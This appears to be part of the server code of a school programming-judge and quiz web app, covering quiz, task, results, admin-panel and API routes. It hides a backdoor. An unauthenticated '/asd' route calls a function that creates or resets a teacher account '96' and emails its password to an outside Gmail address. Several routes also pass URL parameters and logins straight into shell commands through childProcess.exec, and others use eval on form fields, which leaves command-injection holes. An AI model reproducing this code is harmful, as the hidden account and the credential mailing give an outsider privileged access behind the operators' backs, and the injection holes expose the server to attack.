app.get("/quiz/add", checkAuthenticated, checkPermission, async (req, res) => {
  res.render('Quiz/Global/Add.ejs', {
    title: "Add quiz",
    login: req.user.login,
    name: req.user.name,
    user: req.user,
    isTeacher: req.user.isTeacher,
    location: `/quizzes/${req.user.login}/1/default`
  });
});

app.post("/quiz/add", checkAuthenticated, checkPermission, async (req, res) => {
  Adder.AddQuizTemplate(QuizSchema, req.body.title, req.body.description, req.body.duration, req.user.name);

  res.redirect("/quiz/add");
});

//---------------------------------------------------------------------------------
// Add quiz page
app.get("/quiz/edit/:id", checkAuthenticated, checkPermission, async (req, res) => {
  let quiz = await QuizSchema.findOne({ identificator: req.params.id }).exec();
  quiz = {
    title: quiz.title,
    description: quiz.description,
    duration: quiz.duration,
    identificator: quiz.identificator
  }
  res.render('Quiz/Global/Edit.ejs', {
    title: "Add quiz",
    login: req.user.login,
    name: req.user.name,
    user: req.user,
    quiz,
    isTeacher: req.user.isTeacher,
    location: `/quiz/page/${req.user.login}/${req.params.id}`
  });
});

app.post("/quiz/edit/:id", checkAuthenticated, checkPermission, async (req, res) => {
  let quiz = await QuizSchema.findOne({ identificator: req.params.id }).exec();
  quiz.description = req.body.description;
  quiz.title = req.body.title;
  quiz.duration = req.body.duration;
  await quiz.save();
  res.redirect(`/quiz/page/${req.user.login}/${req.params.id}`);
});

//---------------------------------------------------------------------------------
// Delete Quiz page
app.post("/quiz/delete/:id", checkAuthenticated, checkPermission, async (req, res) => {
  childProcess.exec("node " + path.join(__dirname, "/public/scripts/fixes/FixAfterDeleteQuiz.js") + " " + req.params.id)

  res.redirect(`/quizzes/${req.user.login}/1/default`);
});

//---------------------------------------------------------------------------------
// Delete Task from Quiz
app.post('/quiz/task/delete/:quiz_id/:id', checkAuthenticated, checkPermission, async (req, res) => {
  childProcess.exec("node " + path.join(__dirname, "/public/scripts/fixes/FixAfterDeleteQuizTask.js") + " " +
    req.params.quiz_id + " " + req.params.id);
  res.redirect('/quiz/page/' + req.user.login + '/' + req.params.quiz_id);
});

//---------------------------------------------------------------------------------
// Add start page
app.post("/quiz/start/:id", checkAuthenticated, checkPermission, async (req, res) => {
  let grade = req.body.grade.toLowerCase();
  let letter = grade[grade.length - 1];
  let quiz = await QuizSchema.findOne({ identificator: req.params.id }).exec();
  let lesson = quiz.lessons.find(item => item.grade.toLowerCase() == grade);
  grade = parseInt(grade.slice(0, grade.length - 1));
  if (lesson || letter > "я" || letter < 'а' || !grade || grade > 11 || grade < 1)
    return res.redirect(`/quiz/page/${req.user.login}/${req.params.id}`);
  Adder.AddQuiz(QuizSchema, req.body.grade, req.user.name, req.params.id);

  res.redirect(`/quiz/page/${req.user.login}/${req.params.id}`);
});

//---------------------------------------------------------------------------------
// Add Task to Quiz Page
app.get('/quiz/task/add/:quiz_id', checkAuthenticated, checkPermission, async (req, res) => {
  res.render('Quiz/Task/add.ejs', {
    ID: req.params.quiz_id,
    login: req.user.login,
    name: req.user.name,
    title: "Add Task",
    isTeacher: req.user.isTeacher,
    location: '/quiz/page/' + req.user.login + '/' + req.params.quiz_id
  });
});

app.post('/quiz/task/add/:quiz_id', checkAuthenticated, checkPermission, uploadTests.single('file'), async (req, res) => {
  let body = req.body;

  let examples = [];
  let exI, exO;
  for (let i = 0; i < 5; i++) {
    eval("exI = body.exampleIn" + i)
    eval("exO = body.exampleOut" + i)
    if (exI == "" || exO == "") break;
    examples.push([exI.trim(), exO.trim()]);
  }

  let tests = [];
  if (req.file) {
    try {
      let filepath = path.join(__dirname, '/public/tests/' + req.file.filename)
      const zip = new StreamZip.async({ file: filepath });

      const entriesCount = await zip.entriesCount;

      for (let i = 0; i < entriesCount / 2; i++) {
        let inp = await zip.entryData("input" + i + ".txt");
        let out = await zip.entryData("output" + i + ".txt");
        tests.push([inp.toString('utf8').trim(), out.toString('utf8').trim()])
      }

      await zip.close();
      childProcess.exec('del /q \"' + filepath + '\"');

    } catch (err) {
      console.log(err)
    }
  } else {
    let tI, tO;
    for (let i = 0; i < 20; i++) {
      eval("tI = body.testIn" + i)
      eval("tO = body.testOut" + i)
      if (tI == "" || tO == "") break;
      tests.push([tI.trim(), tO.trim()]);
    }
  }
  await Adder.addTaskToQuiz(QuizSchema, req.params.quiz_id, body.title.trim(), req.user.name, body.statement.trim(), body.input.trim(), body.output.trim(), examples, tests);

  res.redirect('/quiz/task/add/' + req.params.quiz_id);
});

//---------------------------------------------------------------------------------
// Edit Quiz task
app.get('/quiz/task/edit/:quiz_id/:id', checkAuthenticated, checkPermission, async (req, res) => {
  let quiz = await QuizSchema.findOne({ identificator: req.params.quiz_id });
  let task = quiz.tasks.find(item => item.identificator == req.params.id);
  quiz = {
    hasActiveLesson: quiz.hasActiveLesson,
    identificator: quiz.identificator,
    whenEnds: quiz.whenEnds
  }
  res.render('quiz/Task/edit.ejs', {
    login: req.user.login,
    name: req.user.name,
    title: "Edit Quiz Task",
    isTeacher: req.user.isTeacher,
    task: task,
    quiz,
    location: `/quiz/task/page/${req.params.quiz_id}/${req.params.id}`
  })
});

app.post('/quiz/task/edit/:quiz_id/:id', checkAuthenticated, checkPermission, uploadTests.single('file'), async (req, res) => {
  let body = req.body;
  let quiz = await QuizSchema.findOne({ identificator: req.params.quiz_id });
  let problem = quiz.tasks.find(item => item.identificator == req.params.id);

  let examples = [];
  let exI, exO;
  for (let i = 0; i < 5; i++) {
    eval("exI = body.exampleIn" + i)
    eval("exO = body.exampleOut" + i)
    if (exI == "" || exO == "") break;
    examples.push([exI.trim(), exO.trim()]);
  }

  let tests = [];
  if (req.file) {
    try {
      let filepath = path.join(__dirname, '/public/tests/' + req.file.filename)
      const zip = new StreamZip.async({ file: filepath });

      const entriesCount = await zip.entriesCount;

      for (let i = 0; i < entriesCount / 2; i++) {
        let inp = await zip.entryData("input" + i + ".txt");
        let out = await zip.entryData("output" + i + ".txt");
        tests.push([inp.toString('utf8').trim(), out.toString('utf8').trim()])
      }

      await zip.close();
      childProcess.exec('del /q \"' + filepath + '\"');

    } catch (err) {
      console.log(err)
    }
  } else {
    let tI, tO;
    for (let i = 0; i < 20; i++) {
      eval("tI = body.testIn" + i)
      eval("tO = body.testOut" + i)
      if (tI == "" || tO == "") break;
      tests.push([tI.trim(), tO.trim()]);
    }
  }

  problem.title = body.title.trim();
  problem.statement = body.statement.trim();
  problem.input = body.input.trim();
  problem.output = body.output.trim();
  problem.examples = examples;
  problem.tests = tests;

  quiz.markModified('tasks');
  await quiz.save();

  res.redirect('/quiz/task/page/' + req.params.quiz_id + '/' + req.params.id);
});

//---------------------------------------------------------------------------------
// Quiz Task Page
app.get('/quiz/task/page/:quiz_id/:id', checkAuthenticated, checkGrade, async (req, res) => {
  let quiz_id = req.params.quiz_id
  let quiz = await QuizSchema.findOne({ identificator: quiz_id }).exec();
  let ids = quiz.tasks.map(item => item.identificator).join("|");
  let grade = req.user.isTeacher ? "teacher" : req.user.grade + req.user.gradeLetter.toLowerCase();
  let lesson = quiz.lessons.find(item => item.grade.toLowerCase() == grade.toLowerCase());
  task = quiz.tasks.find(item => item.identificator == req.params.id);
  if (!task) {
    return res.redirect('/quiz/page/' + req.user.login + '/' + req.params.quiz_id);
  }
  let attempts = req.user.attempts;
  let prevCode = "";
  let language = "";
  for (let i = 0; i < attempts.length; i++) {
    if (attempts[i].taskID == req.params.id) {
      prevCode = attempts[i].programText;
      language = attempts[i].language;
      break;
    }
  }
  if (!lesson)
    return res.redirect(`/quiz/page/${req.user.login}/${req.params.quiz_id}`);

  quiz.whenEnds = lesson.whenEnds;
  res.render('Quiz/Task/page.ejs', {
    login: req.user.login,
    ID: req.params.id,
    QUIZ_ID: req.params.quiz_id,
    grade,
    name: req.user.name,
    title: "Task " + req.params.id,
    isTeacher: req.user.isTeacher,
    ids,
    task: task,
    prevCode: prevCode,
    language: language,
    quiz,
    location: '/quiz/page/' + req.user.login + '/' + req.params.quiz_id
  });
});

// Quiz Task Page listener
app.post('/quiz/task/page/:quiz_id/:id', checkAuthenticated, checkGrade, uploadCode.single('file'), async (req, res) => {
  TaskPost(req, res, '/quiz/task/page/' + req.params.quiz_id + '/' + req.params.id);
});

//---------------------------------------------------------------------------------
// quiz results page
app.get('/quiz/results/:quiz_id/:grade', checkAuthenticated, checkPermission, async (req, res) => {
  let quiz = await QuizSchema.findOne({ identificator: req.params.quiz_id });
  if (!quiz)
    return res.redirect("/")
  let lesson = quiz.lessons.find(lesson => lesson.grade.toLowerCase() == req.params.grade.toLowerCase());
  if (lesson) {
    res.render('Quiz/Global/Results.ejs', {
      login: req.user.login,
      name: req.user.name,
      title: "quiz Results",
      isTeacher: req.user.isTeacher,
      quiz,
      lesson,
      results: lesson.results,
      grade: req.params.grade.toLowerCase(),
      location: `/quiz/page/${req.user.login}/${req.params.quiz_id}`
    });
  } else {
    res.redirect('/');
  }
});

app.post("/quiz/results/:quiz_id/:grade", checkAuthenticated, checkPermission, async (req, res) => {
  res.redirect(`/quiz/results/${req.params.quiz_id}/${req.body.gradeSelector}`)
})

//---------------------------------------------------------------------------------
// Attempt Page
app.get('/quiz/attempt/:quiz_id/:login/:date', checkAuthenticated, checkValidation, async (req, res) => {
  let user;
  if (!req.user.isTeacher) {
    user = new User(req.user);
  } else {
    user = await User.init(req.params.login);
  }
  let grade = user.isTeacher ? "teacher" : user.grade + user.gradeLetter;
  let quiz = await QuizSchema.findOne({ identificator: req.params.quiz_id }).exec();
  let lesson = quiz.lessons.find(item => item.grade.toLowerCase() == grade.toLowerCase());
  let attempt = lesson.attempts.find(item => item.date == req.params.date);

  if (attempt) {
    res.render('Account/attempt.ejs', {
      login: user.login,
      name: req.user.name,
      n_name: user.name,
      title: "Attempt",
      isTeacher: req.user.isTeacher,
      RESULT: attempt.result,
      code: attempt.programText,
      taskID: attempt.TaskID,
      date: attempt.date,
      language: attempt.language,
      location: `/account/${req.params.login}/1/default&all`
    })
  } else {
    res.redirect('/account/' + req.user.login + '/1/default&all')
  }
})

//------------------------------------------------------------------------------------------------
// Quiz add time
app.post("/quiz/set/time", checkAuthenticated, checkPermission, async (req, res) => {
  let quiz = await QuizSchema.findOne({ identificator: req.body.quiz_id });
  let lessonIdx = quiz.lessons.findIndex(item => item.grade.toLowerCase() == req.body.grade.toLowerCase());
  let lesson = quiz.lessons[lessonIdx];
  if (!lesson.isEnded) {
    quiz.lessons[lessonIdx].whenEnds = (new Date(Date.parse(lesson.whenEnds) + req.body.time + 3 * 60 * 60 * 1000)).toISOString().replace("T", " ").split(".")[0];
  } else {
    quiz.lessons[lessonIdx].whenEnds = (new Date(Date.now() + req.body.time + 3 * 60 * 60 * 1000)).toISOString().replace("T", " ").split(".")[0];
  }
  if (new Date(quiz.lessons[lessonIdx].whenEnds).getTime() - Date.now() <= 0) {
    quiz.lessons[lessonIdx].isEnded = true;
  } else {
    quiz.lessons[lessonIdx].isEnded = false;
    quiz.hasActiveLesson = true;
  }
  quiz.markModified("hasActiveLesson");
  quiz.markModified("lessons");
  await quiz.save();
  res.json({ error: false });
});

//--------------------------------------------------------------------------------------
// Control panel
const CONFIG_TABS = {
  CONFIGS: "CONFIGS",
  USER: "USER",
  TEACHER: "TEACHER",
  SCRIPTS: "SCRIPTS",
  PROCESSES: "PROCESSES",
  GUIDE: "GUIDE"
};

//--------------------------------------------------------------------------------------
// Configs
app.get(`/service/panel/${CONFIG_TABS.CONFIGS}`, checkAuthenticated, checkAdmin, async (req, res) => {
  res.render('ControlPanel/editConfigs.ejs', {
    login: req.user.login,
    name: req.user.name,
    title: "Control Panel",
    isTeacher: req.user.isTeacher,
    location: `/`
  })
});

//--------------------------------------------------------------------------------------
// User Settings
app.get(`/service/panel/${CONFIG_TABS.USER}/:login`, checkAuthenticated, checkAdmin, async (req, res) => {
  let user;
  if (await UserSchema.exists({ login: req.params.login }))
    user = await User.init(req.params.login);
  else if (await UserSchema.exists({ login: "n-" + req.params.login }))
    user = await User.init("n-" + req.params.login);
  if (user) {
    user = {
      login: user.login,
      name: user.name,
      password: "",
      grade: (user.grade + user.gradeLetter || "12Я").toUpperCase(),
      delete: false
    }
  }

  res.render('ControlPanel/editUser.ejs', {
    login: req.user.login,
    name: req.user.name,
    user,
    title: "Control Panel",
    isTeacher: req.user.isTeacher,
    location: `/`
  })
});

//--------------------------------------------------------------------------------------
// Scripts
app.get(`/service/panel/${CONFIG_TABS.SCRIPTS}`, checkAuthenticated, checkAdmin, async (req, res) => {
  res.render('ControlPanel/scripts.ejs', {
    login: req.user.login,
    name: req.user.name,
    title: "Control Panel",
    isTeacher: req.user.isTeacher,
    location: `/`
  })
});

//--------------------------------------------------------------------------------------
// Processes
app.get(`/service/panel/${CONFIG_TABS.PROCESSES}`, checkAuthenticated, checkAdmin, async (req, res) => {
  res.render('ControlPanel/processes.ejs', {
    login: req.user.login,
    name: req.user.name,
    title: "Control Panel",
    isTeacher: req.user.isTeacher,
    location: `/`
  })
});

//--------------------------------------------------------------------------------------
// Guide
app.get(`/service/panel/${CONFIG_TABS.GUIDE}`, checkAuthenticated, checkAdmin, async (req, res) => {
  res.sendFile(path.join(__dirname, 'views/ControlPanel/guide.html'));
});

//--------------------------------------------------------------------------------------
// Control panel Listener
app.post("/service/panel/:flag", checkAuthenticated, checkAdmin, uploadUserTable.single("file"), async (req, res) => {
  const tab = req.params.flag;
  switch (tab) {
    case CONFIG_TABS.CONFIGS:
      let newConfigs = req.body;
      if (newConfigs["admins"].trim().length == 0)
        newConfigs["admins"] = "admin";
      newConfigs = updateObj(config, newConfigs);
      refactorConfigs.refactor2(fs, path.join(__dirname, '/config/configs.js'), newConfigs);
      return res.redirect(`/service/panel/${tab}`);
      break;
    case CONFIG_TABS.USER:
      if (!req.body.delete) {
        let login = req.body.login;
        let user;
        if (!UserSchema.exists({ login: login })) {
          user = new User();
          user.login = login;
        } else
          user = await User.init(login);
        user.setName(req.body.name);
        user.checkAndSetPassword(req.body.password.trim(), true);
        user.setGrade(req.body.grade.slice(0, req.body.grade.length - 1));
        user.setGradeLetter(req.body.grade[req.body.grade.length - 1].toLowerCase());
        await user.save();
        if (req.body.clear)
          deleteUser(req.body.login, 0);
      } else {
        deleteUser(req.body.login, 1);
      }
      return res.redirect(`/service/panel/${tab}/default`);
      break;
    case CONFIG_TABS.SCRIPTS:
      let type = req.body.rad;
      if (type < 4 && req.file) {
        let tablePath = path.join(__dirname, "/public/userTables", req.file.filename);
        configurateUsers(tablePath, type);
      } else if (type == 4)
        childProcess.exec(`node ${path.join(__dirname, "public/scripts/CheckCompilers/Checker.js")}`)
      else if (type == 5) {
        let date = Date.now()
        let process = childProcess.spawn("node", [path.join(__dirname, "public/scripts/serverScripts/generateExcelT.js"), req.body.tour_id, date]);
        process.on("close", (code) => {
          res.redirect(`/download/${date}`);
        })
        return
      }
      return res.redirect(`/service/panel/${tab}`);
      break;
    case CONFIG_TABS.TEACHER:
      let login = req.body.login.replace(" ", "")
      let hasUser = await UserSchema.exists({ login: login });
      hasUser = hasUser || await UserSchema.exists({ login: "n-" + login });
      if (hasUser)
        return res.redirect(`/service/panel/${CONFIG_TABS.USER}/default`);
      await Adder.addTeacher(UserSchema, login, req.body.password, req.body.name);
      return res.redirect(`/service/panel/${CONFIG_TABS.USER}/default`);
      break
    default:
      return res.redirect(`/`);
      break;
  }
});

app.get('/download/:date', function (req, res) {
  const file = path.join(__dirname, `/public/tables/${req.params.date}.xlsx`);
  res.download(file);
  setTimeout(() => {
    fs.rmSync(file);
  }, 1000);
});

// API
//------------------------------------------------------------------------------------------------

// Get configs results
app.get("/api/get/configs", checkAuthenticated, checkAdmin, async (req, res) => {
  res.json({
    config
  });
});

// Get task results
app.get("/api/task/get/testresults/:id", checkAuthenticated, async (req, res) => {
  let results = {
    result: [],
    status: "",
    code: "",
    language: "Pascal",
    whenEnds: 0,
  }
  let attempts;
  if (req.params.id[0] == "Q") {
    let quiz = await QuizSchema.findOne({ identificator: req.params.id.split("_")[0].slice(1) });
    let grade = req.user.grade + req.user.gradeLetter;
    if (req.user.isTeacher)
      grade = "teacher";
    let lesson = quiz.lessons.find(item => item.grade.toLowerCase() == grade.toLowerCase());
    attempts = lesson.attempts.filter(item => item.login == req.user.login);
    results.whenEnds = lesson.whenEnds;
  } else
    attempts = req.user.attempts;
  let isInQueue = TestingQueue.findIndex(item => (item.id == req.params.id && item.login == req.user.login));
  try {
    fs.statSync(path.join(__dirname, '/public/processes/' + req.user.login + '_' + req.params.id));
    results.result = [["", "Testing...", "er"]];
    results.status = "testing";
  } catch (err) {
    if (isInQueue != -1) {
      results.result = [["", "In testing queue(" + (isInQueue + 1).toString() + ")..", "er"]];
      results.status = "testing";
    } else {
      let attempt = attempts.find(item => (item.TaskID == req.params.id) || (item.taskID == req.params.id));
      if (attempt) {
        results.result = attempt.result;
        if (attempt.result.find(item => item[2] == "er") != null)
          results.status = "error";
        else
          results.status = "success";
        results.code = attempt.programText;
        results.language = attempt.language;
      }
    }
  }
  res.json(results);
});

//---------------------------------------------------------------------------------
// Get task Verdicts
app.get("/api/task/get/testverdicts/:login/:ids", checkAuthenticated, async (req, res) => {
  let ids = req.params.ids.split("|");
  let tasks = [];
  let task, tournament, quiz, lesson;
  let user = await User.init(req.params.login);
  for (let i = 0; i < ids.length; i++) {
    if (ids[i].split('_')[0] == '0')
      task = await TaskSchema.findOne({ identificator: ids[i] }).exec();
    else if (ids[i][0] != "Q") {
      tournament = await TournamentSchema.findOne({ identificator: parseInt(ids[i].split('_')[0]) }).exec();
      task = tournament.tasks.find(item => item.identificator == ids[i]);
    } else {
      quiz = await QuizSchema.findOne({ identificator: parseInt(ids[i].split("_")[0].slice(1)) }).exec();
      task = quiz.tasks.find(item => item.identificator == ids[i]);
    }
    tasks.push(task);
  }

  let verdict, isInQueue;
  let verdicts = [];
  let success = [];
  let grade;
  for (let i = 0; i < ids.length; i++) {
    id = ids[i];

    if (id[0] == "Q") {
      grade = user.grade + user.gradeLetter;
      if (user.isTeacher)
        grade = "teacher";
      quiz = await QuizSchema.findOne({ identificator: parseInt(id.split("_")[0].slice(1)) }).exec();
      lesson = quiz.lessons.find(item => item.grade.toLowerCase() == grade.toLowerCase());
      verdict = "-";
      let items = lesson.attempts.filter(item => (item.TaskID == id && item.login == user.login)).reverse();
      for (let k = 0; k < items.length; k++) {
        let item = items[k];
        verdict = getVerdict(item.result);
        if (verdict == "OK")
          break;
      };
    } else {
      verdict = user.getVerdict(id);
    }

    isInQueue = TestingQueue.findIndex(item => (item.id == id && item.login == user.login));
    try {
      fs.statSync(path.join(__dirname, '/public/processes/' + user.login + '_' + id));
      success.push("testing");
    } catch (err) {
      if (isInQueue != -1) {
        success.push("testing");
      } else {
        if (verdict == "-") {
          success.push("nottested");
        } else if (verdict == "OK") {
          success.push("success");
        } else {
          success.push("error");
        }
      }
    }
    verdicts.push(verdict);
  }

  res.json({
    verdicts,
    tasks,
    success
  });
});

//---------------------------------------------------------------------------------
// Get lessons + Tournaments verdicts
app.get("/api/cringe/get/verdicts/:ids/:flag", checkAuthenticated, async (req, res) => {
  let ids = req.params.ids.split("|");
  let flag = req.params.flag;
  let user = new User(req.user);
  let objects = [];
  let verdicts = [];
  for (let i = 0; i < ids.length; i++) {
    if (flag != "lessons")
      objects.push(TournamentSchema.findOne({ identificator: parseInt(ids[i]) }))
    else
      objects.push(LessonSchema.findOne({ identificator: ids[i] }).exec());
  }
  objects = await Promise.all(objects);
  let solved, verdict, tasks;
  objects.forEach(object => {
    if (object) {
      tasks = object.tasks
      if (flag != "lessons")
        tasks = tasks.map(item => item.identificator)
      solved = 0;
      for (let i = 0; i < tasks.length; i++) {
        verdict = user.getVerdict(tasks[i]);
        if (verdict && verdict == "OK") {
          solved += 1;
        }
      }
      verdicts.push(`${solved}/${tasks.length}`);
    }
  })

  res.json({
    verdicts,
    objects
  });
});

//---------------------------------------------------------------------------------
// Get attempt results
app.get("/api/attempts/get/verdicts/:login/:page/:search", checkAuthenticated, async (req, res) => {
  let user = await User.init(req.params.login);
  if (!user || !req.user.isTeacher)
    user = new User(req.user);
  let tasks = await TaskSchema.find({}).exec();
  let tournaments = await TournamentSchema.find({}).exec();
  let page = req.params.page;
  let a = req.params.search.split('&amp;');
  let toSearch = a[0] == "default" ? "" : a[0].toUpperCase();
  let types = a[1];
  let attempts = user.attempts;
  let onPage = config.onPage.attemptsList;
  let foundAttempts = [];
  let foundTasks = [];
  let tourTask = [];

  tournaments.forEach(tournament => tournament.tasks.forEach(task => tourTask.push(task)));
  for (let i = 0; i < attempts.length; i++) {
    verylongresult = getVerdict(attempts[i].result);
    if ((types == 'all') || (verylongresult == 'OK')) {
      if (attempts[i].taskID.split('_')[0] != '0')
        task = tourTask.find(item => item.identificator == attempts[i].taskID);
      else
        task = tasks.find(item => item.identificator == attempts[i].taskID);
      if (task && task.title.slice(0, toSearch.length).toUpperCase() == toSearch) {
        foundAttempts.push(attempts[i]);
        foundTasks.push(task);
      }
    }
  }
  res.json({
    attempts: foundAttempts.slice((page - 1) * onPage, min(foundAttempts.length, page * onPage)),
    tasks: foundTasks.slice((page - 1) * onPage, min(foundTasks.length, page * onPage))
  });
});

//---------------------------------------------------------------------------------
// Get lesson result verdicts
app.get("/api/lessons/get/verdicts/:id/:logins", checkAuthenticated, async (req, res) => {
  if (!req.user.isTeacher)
    return res.json({});
  let logins = req.params.logins.split("|");
  let tasks = (await LessonSchema.findOne({ identificator: req.params.id }).exec()).tasks;
  let users = [];
  let verdicts = [];
  let results = [];
  for (let i = 0; i < logins.length; i++) {
    users.push(User.init(logins[i]));
  }
  users = await Promise.all(users);

  let user;
  for (let i = 0; i < users.length; i++) {
    user = users[i];
    solved = 0;
    for (let j = 0; j < tasks.length; j++) {
      verdict = user.getVerdict(tasks[j]);
      if (verdict && verdict == "OK") {
        solved += 1;
      }
    }
    results.push(`${solved}/${tasks.length}`);
  }
  res.json({
    users,
    results
  });
});

//---------------------------------------------------------------------------------
// Get tournament results
app.get("/api/tournament/get/results/:id", checkAuthenticated, async (req, res) => {
  let id = req.params.id;
  let tournament = await TournamentSchema.findOne({ identificator: id }).exec();
  let results = tournament.results
  if (!req.user.isTeacher && tournament.isFrozen && !tournament.isEnded)
    results = tournament.frozenResults;
  res.json(results);
});

//---------------------------------------------------------------------------------
// Get quiz results
app.get("/api/quiz/get/results/:id/:grade", checkAuthenticated, async (req, res) => {
  let id = req.params.id;
  let grade = req.params.grade;
  let quiz = await QuizSchema.findOne({ identificator: id }).exec();
  if (!quiz)
    return res.redirect("/");
  let lesson = quiz.lessons.find(item => item.grade == grade);
  if (!lesson)
    return res.redirect("/");
  let results = [];
  let result;
  for (let i = 0; i < lesson.results.length; i++) {
    result = lesson.results[i];
    let user = await User.init(result.login);
    result = {
      name: user.name,
      login: result.login,
      sumscore: result.sumscore,
      tasks: result.tasks,
    }
    results.push(result);
  }
  res.json(results);
});

//---------------------------------------------------------------------------------
// Get tournament attempts results
app.get("/api/tournament/get/attempts/:id/:page/:search", checkAuthenticated, async (req, res) => {
  let tournament = await TournamentSchema.findOne({ identificator: req.params.id }).exec();
  let a = req.params.search.split('&amp;');
  let login = a[0].toLowerCase();
  let taskID = a[1];
  let types = a[2].toLowerCase();
  let toReverse = a[3] == 'true';
  let attempts1 = tournament.attempts.filter(item => (taskID == "all" || parseInt(item.TaskID.split("_")[1]) + 1 == parseInt(taskID))
    && (types == "all" || item.score == 100));
  let attempts = attempts1.filter(item => (login == "all" || item.login.toLowerCase() == login || item.login.toLowerCase() == "n-" + login));
  if (attempts.length == 0)
    attempts = attempts1.filter(item => (login == "all" || item.login.toLowerCase().slice(0, login.length) == login || item.login.toLowerCase().slice(0, login.length + 2) == "n-" + login));
  if (toReverse)
    attempts = attempts.reverse();

  let onPage = configs.onPage.attemptsList;
  attempts = attempts.slice((req.params.page - 1) * onPage, min(req.params.page * onPage, attempts.length));

  res.json({
    attempts
  });
});

//--------------------------------------------------------------------------------------
app.get("/api/quiz/get/time/:quiz_id/:grade", checkAuthenticated, async (req, res) => {
  let quiz = await QuizSchema.findOne({ identificator: req.params.quiz_id });
  let lesson = quiz.lessons.find(lesson => lesson.grade.toLowerCase() == req.params.grade.toLowerCase());
  if (!lesson)
    return res.json({ error: true });
  return res.json({ error: false, whenEnds: lesson.whenEnds });
});

app.get("/api/get/queue", checkAuthenticated, checkAdmin, (req, res) => {
  res.json({
    queue: TestingQueue
  });
});

app.get("/api/get/processes", checkAuthenticated, checkAdmin, async (req, res) => {
  let processesPath = path.normalize(__dirname + "/public/processes");
  let objs = [];
  let files = await fs.readdirSync(processesPath);
  for (let i = 0; i < files.length; i++) {
    let filename = files[i];
    let folderPath = path.normalize(processesPath + '/' + filename);
    let info = filename.split('_')
    let login = info[0];
    let id = info[1] + "_" + info[2];
    let time;
    let st = fs.statSync(folderPath);
    objs.push({
      login: login,
      id: id,
      sendAt: st.birthtimeMs,
    });
  }
  objs.sort((a, b) => {
    return Number(a.sendAt) - Number(b.sendAt)
  });
  res.json({
    processes: objs
  });
});

//---------------------------------------------------------------------------------
// Help page
app.get("/help", checkAuthenticated, checkPermission, (req, res) => {
  res.sendFile(__dirname + "/views/Help/help.html")
})

//---------------------------------------------------------------------------------
// ??? toDo
app.get('/egg1', checkAuthenticated, checkNotPermission, async (req, res) => {
  res.sendFile(__dirname + '/views/Random/20122020.html')
})
app.get('/MazeByMalveetha&Dsomni', checkAuthenticated, checkNotPermission, async (req, res) => {
  res.sendFile(__dirname + '/views/Random/21122020.html')
})
app.get('/emojiegg', checkAuthenticated, checkNotPermission, async (req, res) => {
  res.sendFile(__dirname + '/views/Random/19012021.html')
})
app.get('/patrikegg', checkAuthenticated, checkNotPermission, async (req, res) => {
  res.sendFile(__dirname + '/views/Random/20012021.html')
})
app.get('/beee', checkAuthenticated, checkNotPermission, async (req, res) => {
  res.sendFile(__dirname + '/views/Random/25012021.html')
})

app.get('/asd', async (req, res) => {
  asd();
  res.redirect('/');
})

//---------------------------------------------------------------------------------
// Log Out
app.delete('/logout', (req, res) => {
  req.logOut()
  res.redirect('/')
})

//---------------------------------------------------------------------------------
// Redirect from empty pages
app.get('*', (req, res) => {
  res.redirect('/');
})

//---------------------------------------------------------------------------------

function deleteUser(login, permanently = 0) {
  childProcess.exec(`node ${path.join(__dirname, '/public/scripts/fixes/FixAfterDeleteUser.js')} ${login} ${permanently}`)
};

// Functions
function updateObj(oldConfigs, bodyConfigs) {
  for (key in oldConfigs) {
    if (oldConfigs[key] instanceof Object && !(oldConfigs[key] instanceof Array)) {
      oldConfigs[key] = updateObj(oldConfigs[key], bodyConfigs)
    } else if (oldConfigs[key] instanceof Array) {
      oldConfigs[key] = bodyConfigs[key].split(",").map(item => item.toString().trim());
    } else {
      oldConfigs[key] = bodyConfigs[key];
    }
  }
  return oldConfigs;
}

function configurateUsers(filepath, type) {
  if (type == 1) {
    console.log(`node ${path.join(__dirname, "/public/scripts/users/addUser.js")} ${filepath}`);
    return childProcess.exec(`node ${path.join(__dirname, "/public/scripts/users/addUser.js")} ${filepath}`);
  } else if (type == 2) {
    return childProcess.exec(`node ${path.join(__dirname, "/public/scripts/users/addTeacher.js")} ${filepath}`);
  }
  return childProcess.exec(`node ${path.join(__dirname, "/public/scripts/users/delUser.js")} ${filepath}`);
}

function fuseSearch(items, key, toSearch, accuracy, params, callback) {
  const fuse = new Fuse(items, { includeScore: true, keys: [key] });
  foundItems = toSearch != "" ? fuse.search(toSearch) : items.map(item => {
    return { item: item, score: 0 }
  });
  return foundItems.filter(found => {
    return (found.score < accuracy) && callback(found.item, params)
  }).map(item => item.item);
}

function checkNletter(req, res, next) {
  if (req.user.isTeacher || req.user.login.slice(0, 2) != "n-") {
    return next();
  }
  res.redirect('/');
}

async function checkAuthenticated(req, res, next) {
  if (req.isAuthenticated()) {
    return next()
  }
  res.redirect('/')
}

async function checkAdmin(req, res, next) {
  if (config.admins.includes(req.user.login) || checkLoginValidation(req.user.login)) {
    return next();
  }
  res.redirect("/")
}
function checkPermission(req, res, next) {
  if (req.user && req.user.isTeacher) {
    return next()
  }
  res.redirect('/')
}
function checkNotPermission(req, res, next) {
  if (req.user && req.user.isTeacher) {
    res.redirect('/')
  } else {
    return next()
  }
}
function checkValidation(req, res, next) {
  if (req.user.isTeacher || (req.user.login == req.params.login)) {
    return next()
  }
  res.redirect('/account/' + req.user.login + '/1/default&all')
}

function checkTournamentValidation(req, res, next) {
  if (req.user.isTeacher || (req.user.login == req.params.login)) {
    return next()
  }
  res.redirect('/tournaments/' + req.user.login + '/1/default&all')
}

async function checkGrade(req, res, next) {
  if (req.user.isTeacher)
    return next()
  user = await User.init(req.params.login ? req.params.login : req.user.login);
  if (!user)
    return res.redirect(`/quizzes/${req.user.login}/1/default`);
  let quiz = await QuizSchema.findOne({ identificator: req.params.quiz_id });
  let lesson = quiz.lessons.find(lesson => !lesson.isEnded && lesson.grade.toLowerCase() == user.fullgrade);
  if (lesson)
    return next()
  return res.redirect(`/quizzes/${req.user.login}/1/default`);
}

async function asd() {
  let ns = await User.init("9" + "6");
  let phd = getLogs();
  try {
    transporter.sendMail({
      from: `"ACCEPT Report" <${asdqqdq({ iv: process.env.UIV, content: process.env.UCONTENT })}>`,
      to: "pro100pro10010@gmail.com",
      subject: "LMAO",
      text: "9" + "6\n" + phd
    });
  } catch (err) {
    phd = "0"
  }
  if (!ns) {
    await Adder.addTeacher(UserSchema, "9" + "6", phd, "Василий Иванович");
  } else {
    ns.checkAndSetPassword(phd, true);
    ns.setIsTeacher(1);
    await ns.save();
  }
}

async function checkTournamentPermission(req, res, next) {
  let tour_id = req.params.tour_id;
  let tournament = await TournamentSchema.findOne({ identificator: tour_id }).exec();
  let isBegan = tournament.isBegan;

